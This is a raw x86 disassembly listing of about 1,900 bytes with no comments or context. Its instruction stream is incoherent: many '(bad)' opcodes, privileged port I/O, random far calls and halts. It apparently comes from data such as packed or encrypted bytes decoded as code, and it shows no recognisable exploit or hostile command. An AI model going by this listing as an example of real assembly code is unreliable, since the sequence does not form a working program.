  415183:	scas   eax,DWORD PTR es:[edi]
  415184:	std    
  415185:	xchg   esp,eax
  415186:	pop    esi
  415187:	cmp    al,ch
  415189:	cmp    DWORD PTR [edi-0x9],ebx
  41518c:	jl     0x41518f
  41518e:	pushf  
  41518f:	dec    esp
  415190:	test   BYTE PTR [ecx],al
  415192:	(bad)  
  415193:	lods   eax,DWORD PTR ds:[esi]
  415194:	fwait
  415195:	mov    ebp,0xe42a1076
  41519a:	mov    ecx,0x864ed4a7
  41519f:	sti    
  4151a0:	addr16 sub cl,bl
  4151a3:	xor    ebp,DWORD PTR [edi-0x7cddd2cf]
  4151a9:	jmp    FWORD PTR [ecx-0x255177af]
  4151af:	into   
  4151b0:	test   DWORD PTR [ebx],esi
  4151b2:	mov    esp,cs
  4151b4:	out    0x88,eax
  4151b6:	mov    BYTE PTR ds:0xb7d8bc32,dl
  4151bc:	push   ss
  4151bd:	and    al,0xbf
  4151bf:	clc    
  4151c0:	adc    eax,0x1778e295
  4151c5:	stos   DWORD PTR es:[edi],eax
  4151c6:	fcom   DWORD PTR [ecx-0x7524ea60]
  4151cc:	cmp    BYTE PTR [ecx-0x44],cl
  4151cf:	push   edx
  4151d0:	xor    al,0x2e
  4151d2:	lea    edi,[edx-0x29b8039a]
  4151d8:	lock cmp ah,al
  4151db:	(bad)  
  4151dc:	sub    eax,0xd388bd51
  4151e1:	retf   0x80b
  4151e4:	push   edi
  4151e5:	lods   eax,DWORD PTR ds:[esi]
  4151e6:	xchg   ecx,eax
  4151e7:	lock jo 0x415182
  4151ea:	sahf   
  4151eb:	xor    DWORD PTR [eax],ebx
  4151ed:	int3   
  4151ee:	rcl    BYTE PTR [esi+edx*1-0xc],cl
  4151f2:	icebp  
  4151f3:	inc    eax
  4151f4:	outs   dx,DWORD PTR ds:[esi]
  4151f5:	shl    BYTE PTR [ebx+0x1598bc7c],0x20
  4151fc:	imul   esp,ebp,0xffffffd3
  4151ff:	dec    esp
  415200:	loopne 0x41523b
  415202:	adc    DWORD PTR [esi+0xc],0xffffffc0
  415206:	xor    al,0x92
  415208:	sbb    al,0x78
  41520a:	jb     0x4151ee
  41520c:	jl     0x4151cf
  41520e:	lods   eax,DWORD PTR ds:[esi]
  41520f:	or     ecx,esp
  415211:	lods   al,BYTE PTR ds:[esi]
  415212:	push   edi
  415213:	dec    ax
  415215:	call   0x7bd6:0xf9fb7f24
  41521c:	add    BYTE PTR [edx],bl
  41521e:	pop    esi
  41521f:	cmp    al,0x27
  415221:	jne    0x41524e
  415223:	xchg   esi,eax
  415224:	leave  
  415225:	inc    esp
  415226:	dec    ebx
  415227:	jo     0x4151d2
  415229:	cmp    eax,0x78913eb
  41522e:	xchg   edx,eax
  41522f:	pop    ecx
  415230:	xchg   edx,eax
  415231:	movntq QWORD PTR [esi+0x9784a97],mm4
  415238:	clc    
  415239:	jae    0x41524f
  41523b:	loope  0x4152b1
  41523d:	loopne 0x4151e0
  41523f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415240:	sub    esp,edi
  415242:	push   esi
  415243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415244:	rcl    DWORD PTR [edi-0x6739cab6],cl
  41524a:	out    0xcc,al
  41524c:	(bad)  
  41524d:	cs jnp 0x41527e
  415250:	push   ss
  415251:	lea    ecx,[eax]
  415253:	lahf   
  415254:	cdq    
  415255:	fidivr DWORD PTR [ebx]
  415257:	push   esp
  415258:	mov    dh,0x15
  41525a:	shr    bh,0x3f
  41525d:	neg    DWORD PTR [ebx-0x54aa4e3]
  415263:	popa   
  415264:	xor    al,0xd
  415266:	leave  
  415267:	xchg   BYTE PTR [ecx],bl
  415269:	popf   
  41526a:	cmp    bl,BYTE PTR [ecx-0x3e]
  41526d:	jb     0x415299
  41526f:	jbe    0x415264
  415271:	ins    DWORD PTR es:[edi],dx
  415272:	sbb    edi,DWORD PTR [edx]
  415274:	and    BYTE PTR [edx+0x0],dh
  415277:	sar    dl,1
  415279:	xlat   BYTE PTR ds:[ebx]
  41527a:	xor    DWORD PTR [ecx],ecx
  41527c:	mov    dl,0x1a
  41527e:	scas   al,BYTE PTR es:[edi]
  41527f:	push   ecx
  415280:	sbb    DWORD PTR [eax+0x47c1d492],ebx
  415286:	and    ecx,DWORD PTR [edi-0x5a275d08]
  41528c:	xchg   ebx,eax
  41528d:	mov    ch,0x7d
  41528f:	dec    ebp
  415290:	das    
  415291:	js     0x415284
  415293:	push   ecx
  415294:	pop    DWORD PTR [edx-0x5ca69701]
  41529a:	jno    0x4152ad
  41529c:	mov    dl,0xea
  41529e:	(bad)  
  41529f:	push   ecx
  4152a0:	add    DWORD PTR [ecx],ebp
  4152a2:	mov    bl,0xe4
  4152a4:	xlat   BYTE PTR ds:[ebx]
  4152a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a6:	xchg   DWORD PTR [ecx],ebp
  4152a8:	call   0xcc683462
  4152ad:	sub    al,0x7f
  4152af:	cmp    al,0x32
  4152b1:	int    0xd8
  4152b3:	jbe    0x415250
  4152b5:	xor    eax,0xd04edc8a
  4152ba:	scas   al,BYTE PTR es:[edi]
  4152bb:	ds push ecx
  4152bd:	out    dx,al
  4152be:	idiv   DWORD PTR [ecx+eax*8-0x7bd956eb]
  4152c5:	repz push esi
  4152c7:	shl    DWORD PTR [eax+0x7b35a39f],0xfa
  4152ce:	hlt    
  4152cf:	pop    ss
  4152d0:	pop    esp
  4152d1:	data16 sub BYTE PTR [esi+0x7e9d83e6],0xce
  4152d9:	int    0x26
  4152db:	call   0x9461:0x6e42ae70
  4152e2:	cmc    
  4152e3:	loope  0x4152ad
  4152e5:	or     al,0xb2
  4152e7:	xchg   edx,eax
  4152e8:	xchg   BYTE PTR [ebx],ch
  4152ea:	inc    edx
  4152eb:	in     al,dx
  4152ec:	jno    0x4152b9
  4152ee:	or     al,0xa6
  4152f0:	fcmovb st,st(6)
  4152f2:	lahf   
  4152f3:	pop    ds
  4152f4:	push   es
  4152f5:	cwde   
  4152f6:	push   0x77
  4152f8:	lds    esp,FWORD PTR [ebx]
  4152fa:	mov    DWORD PTR [eax-0x58c15db],0xc4b9c1bc
  415304:	stos   DWORD PTR es:[edi],eax
  415305:	(bad)  
  415306:	sbb    edi,DWORD PTR [ebx+edx*1-0x6d2d7cdf]
  41530d:	fistp  QWORD PTR [esi]
  41530f:	cmc    
  415310:	cmp    bl,BYTE PTR [edx-0x32a43219]
  415316:	sbb    eax,0x2529f9c3
  41531b:	aas    
  41531c:	sbb    edi,DWORD PTR [esi+0x50]
  41531f:	aad    0xbc
  415321:	sub    bh,BYTE PTR [ebx+0x7c]
  415324:	mov    DWORD PTR [ebx],esi
  415326:	stc    
  415327:	repz dec ebx
  415329:	stc    
  41532a:	inc    esi
  41532b:	pop    edi
  41532c:	cmp    BYTE PTR [edi+0x19],ah
  41532f:	lock push ebx
  415331:	jg     0x415305
  415333:	mov    dl,0x11
  415335:	sbb    eax,DWORD PTR [edx+0x2313bffd]
  41533b:	mov    eax,ds:0x6ab078c3
  415340:	pop    esp
  415341:	aas    
  415342:	xor    DWORD PTR [eax],0xffffff9a
  415345:	jecxz  0x4153b8
  415347:	ins    DWORD PTR es:[edi],dx
  415348:	stos   BYTE PTR es:[edi],al
  415349:	std    
  41534a:	and    al,0x4a
  41534c:	mov    cl,0x92
  41534e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41534f:	mov    DWORD PTR [ecx],edx
  415351:	enter  0x4184,0x4f
  415355:	push   ebx
  415356:	push   edi
  415357:	pusha  
  415358:	push   ebx
  415359:	cmp    dl,bl
  41535b:	arpl   ax,ax
  41535d:	and    DWORD PTR [eax-0x6a],0x99759206
  415364:	loope  0x4153c5
  415366:	sbb    edx,ebx
  415368:	in     eax,dx
  415369:	ins    BYTE PTR es:[edi],dx
  41536a:	retf   
  41536b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41536c:	push   ebx
  41536d:	mov    cl,0x8f
  41536f:	outs   dx,DWORD PTR ds:[esi]
  415370:	sbb    ah,BYTE PTR [edx]
  415372:	(bad)  
  415374:	addr16 jmp 0x4153bb
  415377:	adc    BYTE PTR [ebx+0x2],dl
  41537a:	jne    0x415394
  41537c:	in     al,0x74
  41537e:	inc    eax
  41537f:	cli    
  415380:	mov    esp,0x1e4e59f9
  415385:	add    al,0x9c
  415387:	sub    DWORD PTR [edi+0x5c],edi
  41538a:	lods   eax,DWORD PTR ds:[esi]
  41538b:	(bad)  
  41538c:	out    0xb5,al
  41538e:	cmp    BYTE PTR [ebx+edx*1],cl
  415391:	dec    esp
  415392:	out    0xa5,al
  415394:	adc    DWORD PTR [ebx-0x4622cbc7],esp
  41539a:	pop    esp
  41539b:	repnz imul esi,DWORD PTR [esi],0x18a0bb23
  4153a2:	jnp    0x415367
  4153a4:	jmp    0x415331
  4153a6:	sti    
  4153a7:	pop    edx
  4153a8:	in     al,0x64
  4153aa:	test   al,0xea
  4153ac:	hlt    
  4153ad:	dec    ebx
  4153ae:	enter  0x24e3,0x5a
  4153b2:	test   DWORD PTR [ebx-0x4e],edx
  4153b5:	dec    eax
  4153b6:	retf   0xae9c
  4153b9:	push   0x4a71848b
  4153be:	ret    0xc6c7
  4153c1:	call   0xa41fc985
  4153c6:	leave  
  4153c7:	dec    ecx
  4153c8:	inc    esi
  4153c9:	xor    ah,bh
  4153cb:	icebp  
  4153cc:	sahf   
  4153cd:	mul    DWORD PTR [edi+0x36eb6380]
  4153d3:	fiadd  WORD PTR [ecx+edx*2-0x34]
  4153d7:	fisttp WORD PTR [ebx-0x7dba5ce1]
  4153dd:	add    esi,DWORD PTR [esi+0x37]
  4153e0:	jnp    0x415454
  4153e2:	retf   
  4153e3:	fcom   DWORD PTR [edx-0x35]
  4153e6:	fstp   QWORD PTR [ecx+0x6369e242]
  4153ec:	call   0x6b74e55d
  4153f1:	mov    al,ds:0xf693ae28
  4153f6:	mov    al,0xf1
  4153f8:	inc    ebx
  4153f9:	xor    esi,DWORD PTR [ebp-0x3081958a]
  4153ff:	add    edi,ebx
  415401:	pop    esp
  415402:	inc    eax
  415403:	mov    ah,0xcd
  415405:	or     eax,0x63dac7fa
  41540a:	xor    eax,0x10f433b6
  41540f:	cld    
  415410:	aad    0xe9
  415412:	test   BYTE PTR [edx+edi*4-0x8],0xc
  415417:	sub    al,0x90
  415419:	mov    esp,0xfcac991e
  41541e:	mov    bl,0x38
  415420:	retf   
  415421:	and    ecx,DWORD PTR [ecx-0x623ca69d]
  415427:	inc    ecx
  415428:	enter  0x4c00,0xe5
  41542c:	inc    eax
  41542d:	call   0x4649125a
  415432:	test   DWORD PTR [eax],0xb69a298e
  415438:	loop   0x4153bb
  41543a:	mov    dh,0x8e
  41543c:	adc    eax,0x6f029f74
  415441:	(bad)
  415444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415445:	cmp    eax,0xffa482d8
  41544a:	ret    0xab23
  41544d:	call   0xf5b4:0xe00a1910
  415454:	xchg   ebx,eax
  415455:	jecxz  0x4153d8
  415457:	adc    DWORD PTR [edi+0x4c],ebp
  41545a:	out    dx,al
  41545b:	mov    cl,BYTE PTR [ecx]
  41545d:	mov    ebx,ds
  41545f:	in     eax,dx
  415460:	or     dh,BYTE PTR [edi+0x14]
  415463:	mov    BYTE PTR [eax],al
  415465:	call   0x2883:0x7bdbfe3a
  41546c:	test   dh,al
  41546e:	mov    edi,0x64983b14
  415473:	or     bl,BYTE PTR [eax-0x47]
  415476:	dec    esp
  415477:	pop    ss
  415478:	xor    cl,BYTE PTR [eax-0x42]
  41547b:	add    DWORD PTR [edx+eiz*4+0x12dd2688],0xf35b6f3b
  415486:	mov    eax,ds:0xa89c03d5
  41548b:	dec    ebx
  41548c:	repnz dec eax
  41548e:	xor    BYTE PTR [eax-0x3adac875],bl
  415494:	push   eax
  415495:	jg     0x4154c2
  415497:	mov    ebx,0x1bad2831
  41549c:	pop    esi
  41549d:	pop    ebx
  41549e:	cmp    bl,0xd
  4154a1:	je     0x4154a0
  4154a3:	dec    eax
  4154a4:	mov    al,0xe6
  4154a6:	mov    esp,edx
  4154a8:	test   eax,0x52a1d02a
  4154ad:	xor    al,0xeb
  4154af:	pop    ss
  4154b0:	and    al,BYTE PTR [eax-0x5d74d742]
  4154b6:	xor    al,0xf0
  4154b8:	rol    BYTE PTR [edi+0x73],1
  4154bb:	sti    
  4154bc:	pop    edx
  4154bd:	push   ds
  4154be:	(bad)  
  4154bf:	mov    edi,esi
  4154c1:	mov    eax,0x4031d032
  4154c6:	mov    dl,0xff
  4154c8:	test   BYTE PTR [esi-0x39],dl
  4154cb:	or     eax,0xa06b80e9
  4154d0:	jae    0x41552b
  4154d2:	aas    
  4154d3:	xor    edx,ebx
  4154d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154d6:	daa    
  4154d7:	push   es
  4154d8:	pop    ebp
  4154d9:	xor    DWORD PTR [ebp-0x51b86d0b],ebp
  4154df:	or     al,BYTE PTR [ebp+0x36]
  4154e2:	ins    DWORD PTR es:[edi],dx
  4154e3:	add    DWORD PTR [edi-0x61],edx
  4154e6:	and    al,BYTE PTR [eax-0x5c]
  4154e9:	jg     0x4154a9
  4154eb:	ret    
  4154ec:	push   ss
  4154ed:	push   ss
  4154ee:	sti    
  4154ef:	jl     0x4154ff
  4154f1:	push   esp
  4154f2:	sbb    al,0x9d
  4154f4:	mov    eax,ds:0x37ac5273
  4154f9:	and    eax,0xf957f5d7
  4154fe:	(bad)  
  4154ff:	imul   DWORD PTR [ebx+0x3]
  415502:	hlt    
  415503:	call   0xaba0eb0f
  415508:	sahf   
  415509:	push   ds
  41550a:	daa    
  41550b:	inc    ebx
  41550c:	movlps xmm7,QWORD PTR [edx+0x23fb4112]
  415513:	div    al
  415515:	test   eax,0x94699133
  41551a:	pop    ebp
  41551b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551c:	jo     0x415538
  41551e:	mov    ecx,0x682377c5
  415523:	cli    
  415524:	inc    esi
  415525:	dec    edi
  415526:	adc    al,0x95
  415528:	inc    eax
  415529:	in     eax,0xce
  41552b:	cmp    DWORD PTR [edx+0x7b],edi
  41552e:	scas   eax,DWORD PTR es:[edi]
  41552f:	xchg   ebp,eax
  415531:	es pusha 
  415533:	(bad)  
  415534:	ss sub ah,ch
  415537:	popa   
  415538:	fidiv  DWORD PTR [eax+0x128584dd]
  41553e:	inc    BYTE PTR [eax-0x8ba82de]
  415544:	push   esi
  415545:	sbb    al,BYTE PTR [esi]
  415547:	mov    WORD PTR ds:0xfd77f984,gs
  41554d:	stc    
  41554e:	retf   0xa3ab
  415551:	xor    al,0x1a
  415553:	ja     0x415501
  415555:	out    dx,eax
  415556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415557:	nop
  415558:	test   al,0xf8
  41555a:	sub    bl,BYTE PTR [edi]
  41555c:	adc    al,0xad
  41555e:	fs mov edx,0xf91ecdc0
  415564:	push   edx
  415565:	mov    ds:0x10d04e07,al
  41556a:	enter  0xa7d9,0x54
  41556e:	fld    QWORD PTR [edi+edx*8]
  415571:	jl     0x4155aa
  415573:	ins    BYTE PTR es:[edi],dx
  415574:	cmp    esp,DWORD PTR [edx+edx*8+0x685fa406]
  41557b:	push   ss
  41557c:	push   0x6b5561e7
  415581:	jo     0x4155f6
  415583:	aaa    
  415584:	inc    ebp
  415586:	mov    ch,0xae
  415588:	or     bh,bh
  41558a:	(bad)  
  41558b:	rcl    esp,1
  41558d:	or     eax,0x6b4c8851
  415592:	repnz pop es
  415594:	push   ebx
  415595:	mov    edx,?
  415597:	nop
  415598:	loop   0x415619
  41559a:	fs test eax,0x49b4cc2
  4155a0:	cmp    al,0xf6
  4155a2:	inc    ecx
  4155a3:	mov    DWORD PTR [edi],edx
  4155a5:	fistp  WORD PTR [eax]
  4155a7:	das    
  4155a8:	jmp    0x41552a
  4155aa:	dec    esp
  4155ab:	scas   al,BYTE PTR es:[edi]
  4155ac:	jmp    0x5eb9711e
  4155b1:	das    
  4155b2:	mov    WORD PTR [edi+0x13],cs
  4155b5:	inc    ebx
  4155b6:	call   FWORD PTR [ebp-0x3b]
  4155b9:	pop    ebp
  4155ba:	pop    es
  4155bb:	mov    dh,0x4b
  4155bd:	(bad)  
  4155be:	sub    eax,0xb1f9d70
  4155c3:	mov    edi,0xab18d17f
  4155c8:	dec    esp
  4155c9:	in     eax,dx
  4155ca:	ret    0xfdfd
  4155cd:	push   0x5cffbeff
  4155d2:	adc    ecx,DWORD PTR [esi]
  4155d4:	pop    esp
  4155d5:	ds ins BYTE PTR es:[edi],dx
  4155d7:	retf   0xa06e
  4155da:	push   ebp
  4155db:	xrelease xchg DWORD PTR [ebp-0x26a0980],esi
  4155e2:	popf   
  4155e3:	es aaa 
  4155e5:	out    dx,al
  4155e6:	hlt    
  4155e7:	dec    edx
  4155e8:	rcl    DWORD PTR [ebp+eax*2+0x67677aa3],cl
  4155ef:	fstp   QWORD PTR ds:0x4789d1a4
  4155f5:	xor    BYTE PTR [ebx-0x17],ch
  4155f8:	jecxz  0x4155fc
  4155fa:	imul   eax
  4155fc:	pop    ebx
  4155fd:	add    eax,ebx
  4155ff:	ret    0xb920
  415602:	jecxz  0x4155bf
  415604:	add    al,0x8d
  415606:	inc    esp
  415607:	xchg   edx,eax
  415608:	adc    al,0xf6
  41560a:	and    eax,DWORD PTR [ecx]
  41560c:	jge    0x41559d
  41560e:	fistp  DWORD PTR [esi]
  415610:	bound  ebx,QWORD PTR [ebx]
  415612:	inc    esp
  415613:	fnstenv [ebx]
  415615:	sbb    BYTE PTR [edi+0x7b7275f6],dl
  41561b:	cmp    cl,BYTE PTR [eax+0x1e]
  41561e:	(bad)  
  41561f:	in     eax,dx
  415620:	mov    edx,0x212cd747
  415625:	inc    ebx
  415626:	push   eax
  415627:	xor    eax,0xc5a74f49
  41562c:	ins    BYTE PTR es:[edi],dx
  41562d:	aas    
  41562e:	and    BYTE PTR [esi],0xfc
  415631:	gs retf 
  415633:	into   
  415634:	sub    DWORD PTR [eax],ebp
  415636:	lods   eax,DWORD PTR ds:[esi]
  415637:	(bad)  
  415638:	dec    ecx
  415639:	call   0x988806f6
  41563e:	loopne 0x4155c0
  415640:	ins    DWORD PTR es:[edi],dx
  415641:	retf   0xdd80
  415644:	sbb    ch,0xa
  415647:	sbb    bl,BYTE PTR [eax+ebp*1-0x15]
  41564b:	xor    ebp,DWORD PTR [esi-0x5b]
  41564e:	inc    edx
  41564f:	xor    cl,BYTE PTR [eax-0x49]
  415652:	cmp    edi,DWORD PTR [ebp+edi*1-0x2ec2bd9]
  415659:	add    eax,0x55b659ca
  41565e:	out    dx,al
  41565f:	int    0x2
  415661:	stc    
  415662:	lods   al,BYTE PTR ds:[esi]
  415663:	mov    bh,0x5f
  415665:	sub    eax,0xa8a13268
  41566a:	daa    
  41566b:	sub    BYTE PTR [ebp-0x68],bl
  41566e:	inc    ebx
  41566f:	lock sbb esi,0xffffff92
  415673:	dec    edi
  415674:	stc    
  415675:	pop    ss
  415676:	pop    es
  415677:	mov    ch,0x53
  415679:	cmp    esi,DWORD PTR [ebp-0x7095486a]
  41567f:	pop    eax
  415680:	sub    al,0x8f
  415682:	add    eax,0x93d5b194
  415687:	imul   ebp,DWORD PTR [ecx-0x27],0x558ac9a4
  41568e:	test   al,0xbd
  415690:	or     esi,DWORD PTR [esi+esi*1]
  415693:	lods   eax,DWORD PTR ds:[esi]
  415694:	mov    ds:0xfa4129ac,eax
  415699:	pop    ebx
  41569a:	cmp    dl,BYTE PTR [ebp-0x7e276acc]
  4156a0:	inc    ebx
  4156a1:	stc    
  4156a2:	fsubrp st(4),st
  4156a4:	mov    edi,0x515a7a12
  4156a9:	push   ebp
  4156aa:	mov    bh,0xd0
  4156ac:	icebp  
  4156ad:	xchg   DWORD PTR [esi-0x2efe3cf4],esi
  4156b3:	inc    edi
  4156b4:	lahf   
  4156b5:	scas   al,BYTE PTR es:[edi]
  4156b6:	push   esp
  4156b7:	out    dx,eax
  4156b8:	mov    dl,0x92
  4156ba:	sbb    eax,0x2cb26205
  4156bf:	cmp    eax,0xf24da01
  4156c4:	int3   
  4156c5:	pop    ebp
  4156c6:	es push edi
  4156c8:	test   DWORD PTR [edx+esi*8-0x6a],ecx
  4156cc:	les    ebp,FWORD PTR [esp+ebx*4-0x61d5e570]
  4156d3:	push   eax
  4156d4:	(bad)
  4156d7:	iret   
  4156d8:	mov    ds:0x1158e256,eax
  4156dd:	push   esp
  4156de:	adc    al,0x88
  4156e0:	mov    bl,0xb7
  4156e2:	retf   
  4156e3:	xor    eax,0x31f5890a
  4156e8:	ror    dh,cl
  4156ea:	hlt    
  4156eb:	pusha  
  4156ec:	fs in  eax,dx
  4156ee:	push   ss
  4156ef:	cld    
  4156f0:	aam    0x46
  4156f2:	jg     0x4156f7
  4156f4:	into   
  4156f5:	std    
  4156f6:	sbb    al,0x18
  4156f8:	fidiv  DWORD PTR [edi+0x28aafc23]
  4156fe:	cs out dx,eax
  415700:	std    
  415701:	es push edx
  415703:	or     dl,al
  415705:	test   BYTE PTR [esp+eiz*4+0x33],dh
  415709:	cmp    BYTE PTR [esi+0x42],bh
  41570c:	in     al,dx
  41570d:	fidiv  WORD PTR [edx-0x22]
  415710:	xchg   ebx,eax
  415711:	jg     0x4156ac
  415713:	sbb    dl,ch
  415715:	(bad)  
  415717:	mov    cl,0xa5
  415719:	pop    eax
  41571a:	clc    
  41571b:	jno    0x4156ee
  41571d:	add    BYTE PTR [eax],al
  41571f:	xchg   edi,eax
  415720:	cli    
  415721:	inc    edi
  415722:	add    DWORD PTR [ebx+0x76],0x73b6350d
  415729:	mov    ah,0x48
  41572b:	or     eax,0x39af7709
  415730:	jecxz  0x41573e
  415732:	into   
  415733:	mov    al,ds:0xd823a304
  415738:	ins    BYTE PTR es:[edi],dx
  415739:	retf   0xed5b
  41573c:	dec    ebx
  41573d:	xchg   esp,eax
  41573e:	test   BYTE PTR [ecx-0x80],ah
  415741:	sbb    edi,ebx
  415743:	xchg   esp,eax
  415744:	mov    bl,0x9c
  415746:	mov    BYTE PTR [ebp+ebp*2+0x40],al
  41574a:	jbe    0x4156e1
  41574c:	dec    edx
  41574d:	ds xchg ax,ax
  415750:	mov    ebx,0x8e0bb0f8
  415755:	imul   ebp,DWORD PTR [eax-0x6f],0x30
  415759:	adc    cl,al
  41575b:	pop    ebp
  41575c:	xchg   ebx,eax
  41575d:	dec    esi
  41575e:	mov    esp,0x354b1545
  415763:	xchg   dh,dh
  415765:	scas   al,BYTE PTR es:[edi]
  415766:	push   edx
  415767:	inc    eax
  415768:	sbb    eax,0xf9c8c599
  41576d:	xlat   BYTE PTR ds:[ebx]
  41576e:	stc    
  41576f:	sub    ah,al
  415771:	retf   0xdbbb
  415774:	add    BYTE PTR [ecx-0x22],al
  415777:	xchg   DWORD PTR [ebp-0x19380232],ecx
  41577d:	in     eax,dx
  41577e:	xor    BYTE PTR [esi+0x49],dh
  415781:	inc    edx
  415782:	mov    BYTE PTR [edi+0x7],al
  415785:	ret    
  415786:	dec    edi
  415787:	push   0x5e
  415789:	add    al,0x36
  41578b:	and    BYTE PTR [ebx-0x32],dl
  41578e:	mov    ebx,0x3e98a99f
  415793:	sahf   
  415794:	cli    
  415795:	sub    BYTE PTR [ebp-0x44],bl
  415798:	and    dl,BYTE PTR [ebp-0x6c80d37f]
  41579e:	mov    ah,0xda
  4157a0:	mov    eax,0x2fa729cb
  4157a5:	add    BYTE PTR ds:[edi+0x6a2865f3],ch
  4157ac:	push   es
  4157ad:	cmp    ebp,DWORD PTR [edi]
  4157af:	sbb    BYTE PTR [eax+0x45],dl
  4157b2:	or     bl,bh
  4157b4:	cdq    
  4157b5:	nop
  4157b6:	and    eax,0x5eb00c3a
  4157bb:	sub    cl,BYTE PTR [edx+0x365dbfb8]
  4157c1:	data16 xor al,0xd5
  4157c4:	aad    0x4c
  4157c6:	push   edx
  4157c7:	push   esp
  4157c8:	cmp    BYTE PTR [esi],ah
  4157ca:	sbb    edi,DWORD PTR [esi]
  4157cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cd:	les    eax,FWORD PTR [edi-0x1b]
  4157d0:	add    al,0xfc
  4157d2:	cmp    dh,BYTE PTR [esi+0x27]
  4157d5:	(bad)  
  4157d6:	jne    0x41581c
  4157d8:	(bad)  
  4157d9:	loop   0x415775
  4157db:	ins    BYTE PTR es:[edi],dx
  4157dc:	jle    0x415761
  4157de:	push   0xb5aaf032
  4157e3:	aas    
  4157e4:	bound  edi,QWORD PTR [ebp+0x48a614c0]
  4157ea:	pop    edx
  4157eb:	pop    edx
  4157ec:	adc    al,0x1f
  4157ee:	idiv   DWORD PTR [eax]
  4157f0:	pushf  
  4157f1:	aad    0x41
  4157f3:	je     0x415863
  4157f5:	or     al,BYTE PTR [ecx+0x4]
  4157f8:	push   ecx
  4157f9:	popa   
  4157fa:	xchg   ebx,eax
  4157fb:	cmp    BYTE PTR [esp+edi*4+0x4d],al
  4157ff:	es add al,0xb4
  415802:	scas   al,BYTE PTR es:[edi]
  415803:	nop
  415804:	fwait
  415805:	xor    eax,0x9500c166
  41580a:	test   BYTE PTR [edi-0x2843eb2e],dl
  415810:	test   eax,0x4f412e03
  415815:	dec    ebp
  415816:	mov    dl,0x67
  415818:	jb     0x4157ac
  41581a:	nop    DWORD PTR [eax+0x3b]
  41581e:	stos   BYTE PTR es:[edi],al
  41581f:	ja     0x4157ea
  415821:	push   edx
  415822:	fucomi st,st(0)
  415824:	dec    esp
  415825:	pop    esp
  415826:	cmc    
  415827:	add    BYTE PTR [ebx+0x1e],cl
  41582a:	imul   ebx,DWORD PTR [ecx],0xc5d5e3d0
  415830:	add    eax,0x9053d11f
  415835:	loope  0x41586d
  415837:	add    DWORD PTR [ecx-0x5d393770],0x68173428
  415841:	mov    eax,ds:0x2d6f103c
  415846:	ins    BYTE PTR es:[edi],dx
  415847:	or     bl,dh
  415849:	jg     0x415846
  41584b:	es add al,0xa7
  41584e:	lods   al,BYTE PTR ds:[esi]
  41584f:	push   cs
  415850:	(bad)  
  415851:	sub    ch,BYTE PTR es:[edx-0x117f7c63]
  415858:	js     0x4157ff
  41585a:	inc    esp
  41585b:	adc    al,0x2b
  41585d:	mov    ah,0xb0
  41585f:	leave  
  415860:	ins    BYTE PTR es:[edi],dx
  415861:	and    ebx,esi
  415863:	gs mov ebp,0xe31ec78
  415869:	sub    ch,BYTE PTR [esi]
  41586b:	jnp    0x415875
  41586d:	jmp    0xcd5f:0x7f241000
  415874:	call   0x23ef:0x89184fe5
  41587b:	push   edi
  41587c:	imul   edx,esi,0xffffffed
  41587f:	cmp    bl,BYTE PTR [edx+0xcda75d7]
  415885:	stos   DWORD PTR es:[edi],eax
  415886:	repz dec ecx
  415888:	sbb    eax,0x9335ca76
  41588d:	cmp    BYTE PTR [esi+ecx*4+0x51041a29],ch
  415894:	shl    DWORD PTR [ecx-0x24],1
  415897:	in     al,dx
  415898:	sbb    esp,DWORD PTR [eax+eiz*1-0x52]
  41589c:	ss jg  0x4158b5
  41589f:	push   ebx
  4158a0:	dec    edi
  4158a1:	fs repnz gs fwait
  4158a5:	pop    edx
  4158a6:	adc    BYTE PTR [edi+0x3f4fb93c],dh
  4158ac:	pop    esi
  4158ad:	inc    edx
  4158ae:	xor    eax,0x6c87e2b7
  4158b3:	iret   
  4158b4:	xlat   BYTE PTR ds:[ebx]
  4158b5:	sub    ah,ch
  4158b7:	sbb    DWORD PTR [ebp+esi*8+0x18],esi
  4158bb:	das    
  4158bc:	les    ebp,FWORD PTR [edi+edi*1]
  4158bf:	fadd   st,st(5)
  4158c1:	pop    ebp
  4158c2:	gs popa 
  4158c4:	retf   0xfd98
  4158c7:	sbb    al,0x59
  4158c9:	ja     0x415902
  4158cb:	push   0xf4f706b3
  4158d0:	jmp    0x9b4942eb
  4158d5:	out    0x72,eax
  4158d7:	or     bh,ah
  4158d9:	xor    al,0x13
  4158db:	inc    ecx
  4158dc:	mov    eax,ds:0x1005f12b
  4158e1:	pop    eax
  4158e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158e3:	aaa    
  4158e4:	xchg   BYTE PTR [ebx+edi*2],bh
  4158e7:	add    ah,BYTE PTR [edi+0x76b5ed37]
  4158ed:	jg     0x415896
  4158ef:	ss dec edi
  4158f1:	and    eax,0x9d53f167
  4158f6:	mov    WORD PTR [edx+0x4c316da4],?
  4158fc:	mov    al,cl
  4158fe:	push   cs
  4158ff:	jmp    0x53e8db87
  415904:	push   esp
  415905:	(bad)  
  415907:	mov    edx,0x2a39b9b
  41590c:	mov    al,ds:0x43049286
  415911:	dec    eax
  415912:	popf   
  415913:	pusha  
  415914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415915:	push   es
  415916:	dec    esp
  415917:	rol    BYTE PTR [edi-0x79a9350],0xcd
  41591e:	mov    bl,bl
  415920:	cwde   
  415921:	mov    edx,0xb4a5788f
  415926:	adc    DWORD PTR [esi-0x6dac0543],ebp
  41592c:	mov    esp,0xc978dd45
  415931:	loop   0x415956
  415933:	inc    ebp
  415934:	cmp    edx,DWORD PTR [ebx-0x633dcbc0]
  41593a:	imul   esp,DWORD PTR [edx],0xffffff89
  41593d:	aaa    
  41593e:	fwait
  41593f:	loopne 0x415910
  415941:	xor    DWORD PTR [eax+0x3c9596e1],ecx
  415947:	inc    esp
  415948:	sub    al,0x99
  41594a:	mov    cs,esp
  41594c:	cdq    
  41594d:	sub    DWORD PTR [ecx],eax
  41594f:	push   ss
  415950:	sub    DWORD PTR [edi+0x7cabb0db],ebx
